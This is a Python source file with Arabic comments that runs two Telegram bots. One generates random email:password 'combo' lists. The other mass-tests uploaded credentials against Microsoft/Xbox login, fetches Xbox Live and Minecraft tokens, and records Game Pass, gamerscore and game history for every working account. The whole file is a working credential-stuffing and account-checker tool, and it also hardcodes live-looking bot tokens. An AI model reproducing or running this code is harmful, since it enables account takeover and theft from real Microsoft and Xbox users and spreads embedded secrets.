import os
import re
import time
import random
import string
import threading
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse, parse_qs
import urllib3
import requests
from requests.adapters import HTTPAdapter
import concurrent.futures

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

urllib3.disable_warnings()

# ==========================================
# إعدادات التوكنات والمعرفات الخاصة بك يا علي
# ==========================================
COMBO_BOT_TOKEN = "6630800841:AAHQsdP55u1z7qx-m7h-yxm1LJ_V3oeLMeY"
CHECKER_BOT_TOKEN = "8904129571:AAEF7Oy_Z1NEIxE1TZMm7LlgXO43GrLnzIk"
OWNER_ID = 705071845

# ==========================================
# قسم بوت الكومبوات (عالي الصيد 2016-2026)
# ==========================================
BASE_DIR_COMBO = Path("gen_data")
BASE_DIR_COMBO.mkdir(parents=True, exist_ok=True)

DOMAINS = ["gmail.com", "hotmail.com", "outlook.com", "yahoo.com"]
USERNAMES = [
    "gamer", "xbox", "pro", "king", "sniper", "alex", "david", "michael", 
    "shadow", "storm", "blaze", "wolf", "dragon", "alpha", "ghost", "matrix",
    "viper", "eagle", "falcon", "nexus", "titan", "hunter", "turbo", "zain",
    "ahmed", "mohamed", "ali", "omar", "youssef", "hassan", "khaled", "zizo"
]
YEARS_RANGE = [str(y) for y in range(2016, 2027)]

def combo_allowed(update: Update) -> bool:
    user = update.effective_user or (update.callback_query and update.callback_query.from_user)
    return bool(user and user.id == OWNER_ID)

def generate_random_password(length=12):
    chars = string.ascii_letters + string.digits + "!@#$%&*"
    return "".join(random.choice(chars) for _ in range(length))

def generate_combos_text(count=100):
    combos = []
    for _ in range(count):
        user_base = random.choice(USERNAMES)
        year_suffix = random.choice(YEARS_RANGE)
        
        if random.choice([True, False]):
            email_user = f"{user_base}{year_suffix}"
        else:
            email_user = f"{user_base}_{random.randint(10, 99)}{year_suffix}"
            
        domain = random.choice(DOMAINS)
        email = f"{email_user}@{domain}"
        password = generate_random_password(random.randint(10, 15))
        combos.append(f"{email}:{password}")
    return combos

async def combo_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not combo_allowed(update):
        return
    keyboard = [
        [InlineKeyboardButton("⚡ توليد 100 كومبو (عالي الدقة)", callback_data="gen_100")],
        [InlineKeyboardButton("🔥 توليد 500 كومبو (عالي الدقة)", callback_data="gen_500")],
        [InlineKeyboardButton("🚀 توليد 1000 كومبو (عالي الدقة)", callback_data="gen_1000")]
    ]
    await update.message.reply_text(
        "🤖 **أهلاً بك يا علي في بوت توليد الكومبوات!**\n\n"
        "• الكومبوات مجهزة بنمط يرفع نسبة الصيد الدقيق.\n"
        "• اختر الكمية أدناه:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def combo_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not combo_allowed(update):
        await query.answer("غير مسموح.", show_alert=True)
        return

    await query.answer()
    data = query.data
    chat_id = query.message.chat_id
    
    count = 100
    if data == "gen_500":
        count = 500
    elif data == "gen_1000":
        count = 1000

    await query.edit_message_text(text=f"⏳ جاري توليد {count} كومبو...")
    combos = generate_combos_text(count)
    
    filename = BASE_DIR_COMBO / f"Combos_Precise_{count}_{random.randint(10000, 99999)}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write("\n".join(combos))

    with open(filename, "rb") as doc:
        await context.bot.send_document(
            chat_id=chat_id,
            document=doc,
            caption=f"✅ **تم التوليد بنجاح!**\n📦 العدد: {count}",
            parse_mode="Markdown"
        )
    
    keyboard = [
        [InlineKeyboardButton("⚡ توليد 100 كومبو", callback_data="gen_100")],
        [InlineKeyboardButton("🔥 توليد 500 كومبو", callback_data="gen_500")],
        [InlineKeyboardButton("🚀 توليد 1000 كومبو", callback_data="gen_1000")]
    ]
    await context.bot.send_message(
        chat_id=chat_id,
        text="هل تريد توليد دفعة أخرى؟",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ==========================================
# قسم بوت الفحص العميق المتقدم (ألعاب + نقاط + جيم باس)
# ==========================================
BASE_DIR_CHECKER = Path("bot_data")
UPLOAD_DIR = BASE_DIR_CHECKER / "uploads"
UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
RESULTS_DIR = Path("XBOX_RESULT")
RESULTS_DIR.mkdir(parents=True, exist_ok=True)

def checker_allowed(update: Update) -> bool:
    return bool(update.effective_user and update.effective_user.id == OWNER_ID)

async def checker_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not checker_allowed(update):
        return
    await update.message.reply_text(
        "🤖 **بوت فحص XBOX / Microsoft المتقدم (فحص الألعاب والنقاط والاشتراكات).**\n\n"
        "• أرسل ملف الكومبوات (.txt) وسيبدأ الفحص الشامل وتفصيل الألعاب واستخراج النتائج وإرسالها لك.",
        parse_mode="Markdown"
    )

def process_single_account(combo, session_folder, stats_lock_obj, counters):
    parts = combo.split(':')
    if len(parts) < 2:
        with stats_lock_obj:
            counters["bad"] += 1
            counters["checked"] += 1
        return

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()
    adapter = HTTPAdapter(pool_connections=20, pool_maxsize=20)

    for _ in range(2):
        session = requests.Session()
        session.verify = False
        session.mount('https://', adapter)
        session.mount('http://', adapter)
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })

        try:
            sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
            resp = session.get(sftag_url, timeout=20)
            text = resp.text

            sftag_match = re.search(r'value=\\\"(.+?)\\\"', text) or re.search(r'value="(.+?)"', text)
            url_match = re.search(r'"urlPost":"(.+?)"', text) or re.search(r"urlPost:'(.+?)'", text)

            if not sftag_match or not url_match:
                with stats_lock_obj:
                    counters["bad"] += 1
                    counters["checked"] += 1
                return

            sftag = sftag_match.group(1)
            url_post = url_match.group(1)

            login_data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            login_req = session.post(url_post, data=login_data, headers=headers, allow_redirects=True, timeout=20)

            ms_token = None
            login_text = login_req.text.lower()

            if 'access_token' in login_req.url:
                ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
            elif any(x in login_text for x in ["password is incorrect", "account doesn't exist", "passwords don't match"]):
                with stats_lock_obj:
                    counters["bad"] += 1
                    counters["checked"] += 1
                return
            elif any(x in login_text for x in ["recover", "account.live.com/identity/confirm", "locked", "help us protect"]):
                with stats_lock_obj:
                    counters["twofa"] += 1
                    counters["checked"] += 1
                return
            elif 'cancel?mkt=' in login_text:
                try:
                    ipt_match = re.search(r'"ipt" value="(.+?)"', login_req.text)
                    pprid_match = re.search(r'"pprid" value="(.+?)"', login_req.text)
                    uaid_match = re.search(r'"uaid" value="(.+?)"', login_req.text)
                    action_match = re.search(r'id="fmHF" action="(.+?)"', login_req.text)

                    if ipt_match and pprid_match and uaid_match and action_match:
                        data2 = {'ipt': ipt_match.group(1), 'pprid': pprid_match.group(1), 'uaid': uaid_match.group(1)}
                        ret = session.post(action_match.group(1), data=data2, allow_redirects=True, timeout=20)
                        return_url = re.search(r'"returnUrl":"(.+?)"', ret.text)
                        if return_url:
                            fin = session.get(return_url.group(1), allow_redirects=True, timeout=20)
                            ms_token = parse_qs(urlparse(fin.url).fragment).get('access_token', [None])[0]
                except:
                    pass

            if not ms_token:
                with stats_lock_obj:
                    counters["bad"] += 1
                    counters["checked"] += 1
                return

            xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            xb_headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
            xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, headers=xb_headers, timeout=20)

            if xb_req.status_code != 200:
                with stats_lock_obj:
                    counters["bad"] += 1
                    counters["checked"] += 1
                return

            xb_token = xb_req.json()['Token']
            uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']

            gamerscore = "0"
            gscore_int = 0
            xuid = None
            xsts_xb_token = None

            try:
                xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
                xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, headers=xb_headers, timeout=20)
                if xsts_xb_req.status_code == 200:
                    xsts_xb_token = xsts_xb_req.json()['Token']
                    prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore",
                                           headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, timeout=20)
                    if prof_req.status_code == 200:
                        data = prof_req.json()
                        settings = data.get('profileUsers', [{}])[0].get('settings', [])
                        for s in settings:
                            if s['id'] == 'Gamerscore':
                                gamerscore = s['value']
                                try:
                                    gscore_int = int(gamerscore)
                                except:
                                    gscore_int = 0
                        xuid = data.get('profileUsers', [{}])[0].get('id')
            except:
                pass

            has_gp = False
            has_mc = False
            gp_type = "none"
            mc_ent_text = ""

            try:
                xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
                xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, headers=xb_headers, timeout=20)
                if xsts_mc_req.status_code == 200:
                    xsts_mc_token = xsts_mc_req.json()['Token']
                    mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                                           json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"},
                                           headers={'Content-Type': 'application/json'}, timeout=20)
                    if mc_auth.status_code == 200:
                        mc_token = mc_auth.json().get('access_token')
                        if mc_token:
                            ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore',
                                                  headers={'Authorization': f'Bearer {mc_token}'}, timeout=20)
                            if ent_req.status_code == 200:
                                mc_ent_text = ent_req.text
            except:
                pass

            if 'product_game_pass_ultimate' in mc_ent_text:
                gp_type = "Game Pass Ultimate"
                has_gp = True
            elif 'product_game_pass_pc' in mc_ent_text:
                gp_type = "PC Game Pass"
                has_gp = True
            elif 'product_game_pass_console' in mc_ent_text:
                gp_type = "Xbox Game Pass Console"
                has_gp = True

            if 'product_minecraft' in mc_ent_text:
                has_mc = True

            has_gscore = gscore_int > 0

            purchases_list = []
            purchases_count = 0
            if xuid and xsts_xb_token:
                try:
                    ach_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles?maxItems=50"
                    ach_resp = session.get(
                        ach_url,
                        headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"},
                        timeout=20
                    )
                    if ach_resp.status_code == 200:
                        titles = ach_resp.json().get('titles', [])
                        for t in titles:
                            name = t.get('name', 'Unknown')
                            score = t.get('currentGamerscore', 0)
                            purchases_list.append(f"{name} | {score}G")
                        purchases_count = len(purchases_list)
                except:
                    pass

            # كتابة التقرير بالتفصيل الكامل للحساب داخل الملف المخصص
            filepath = os.path.join(session_folder, "XBOX-Valid.txt")
            with open(filepath, 'a', encoding='utf-8') as f:
                f.write("_________________________________________________________\n")
                f.write(f"Email: {email}\n")
                f.write(f"Password: {password}\n")
                f.write(f"Gamerscore: {gamerscore}G\n")
                f.write(f"GamePass: {gp_type}\n")
                f.write(f"Minecraft: {'Yes' if has_mc else 'No'}\n")
                f.write(f"Purchases: {purchases_count} items\n")
                if purchases_list:
                    for item in purchases_list:
                        f.write(f"  - {item}\n")
                f.write(f"Tool by @zx_dx2\n")
                f.write("_________________________________________________________\n\n")

            with stats_lock_obj:
                counters["hits"] += 1
                if has_gp:
                    counters["gamepass"] += 1
                if has_mc:
                    counters["minecraft"] += 1
                counters["checked"] += 1
            return

        except Exception:
            time.sleep(0.5)
        finally:
            session.close()

    with stats_lock_obj:
        counters["errors"] += 1
        counters["checked"] += 1

async def checker_handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not checker_allowed(update):
        return

    document = update.message.document
    if not document:
        return

    file_name = document.file_name or "combo.txt"
    if not file_name.lower().endswith(".txt"):
        await update.message.reply_text("❌ يرجى إرسال ملف بصيغة TXT فقط.")
        return

    msg = await update.message.reply_text("📥 تم استلام الملف، جاري بدء الفحص العميق واستخراج الألعاب والنقاط...")

    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    input_path = UPLOAD_DIR / f"{stamp}_{file_name}"
    session_folder = RESULTS_DIR / f"Session_{stamp}"
    session_folder.mkdir(parents=True, exist_ok=True)

    tg_file = await document.get_file()
    await tg_file.download_to_drive(custom_path=str(input_path))

    with open(input_path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if ':' in line.strip()]

    total = len(combos)
    if total == 0:
        await msg.edit_text("❌ الملف فارغ أو لا يحتوي على تنسيق صحيح.")
        return

    await msg.edit_text(f"⏳ جاري فحص {total} حساب مع الفحص الشامل للألعاب...")

    counters = {"checked": 0, "hits": 0, "bad": 0, "twofa": 0, "errors": 0, "gamepass": 0, "minecraft": 0}
    status_lock = threading.Lock()

    start_time = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        for combo in combos:
            executor.submit(process_single_account, combo, str(session_folder), status_lock, counters)

    elapsed = int(time.time() - start_time)

    summary = (
        f"📊 **ملخص فحص XBOX الشامل**\n\n"
        f"✅ تم الفحص: {counters['checked']} / {total}\n"
        f"🎯 Hits الحقيقية: {counters['hits']}\n"
        f"🏆 Game Pass: {counters['gamepass']}\n"
        f"⛏️ Minecraft: {counters['minecraft']}\n"
        f"❌ Bad/Other: {counters['bad']}\n"
        f"🔐 2FA: {counters['twofa']}\n"
        f"⏱️ المدة: {elapsed} ثانية"
    )
    await update.message.reply_text(summary, parse_mode="Markdown")

    # إرسال ملف النتائج النهائي المليء بالتفاصيل (الألعاب، النقاط، الاشتراكات)
    fpath = session_folder / "XBOX-Valid.txt"
    if fpath.exists() and fpath.stat().st_size > 0:
        with open(fpath, "rb") as doc_f:
            await update.message.reply_document(
                document=doc_f,
                caption="📁 **ملف الـ Hits المفصل (يحتوي على الألعاب، نقاط الحساب، واشتراكات الـ Game Pass)**"
            )
    else:
        await update.message.reply_text("ℹ️ لم يتم العثور على حسابات صالحة في هذا الملف.")

# ==========================================
# تشغيل البوتين معاً في نفس الوقت
# ==========================================
def run_combo_bot_thread():
    app = Application.builder().token(COMBO_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", combo_start))
    app.add_handler(CallbackQueryHandler(combo_callback))
    print("[+] Combo Bot is running...")
    app.run_polling(drop_pending_updates=True, stop_signals=None)

def run_checker_bot_thread():
    app = Application.builder().token(CHECKER_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", checker_start))
    app.add_handler(MessageHandler(filters.Document.ALL, checker_handle_document))
    print("[+] Checker Bot is running...")
    app.run_polling(drop_pending_updates=True, stop_signals=None)

if __name__ == "__main__":
    print("=== جاري تشغيل بوت التوليد وبوت الفحص الشامل المدمج بنجاح ===")
    
    t1 = threading.Thread(target=run_combo_bot_thread, daemon=True)
    t2 = threading.Thread(target=run_checker_bot_thread, daemon=True)
    
    t1.start()
    t2.start()
    
    t1.join()
    t2.join()
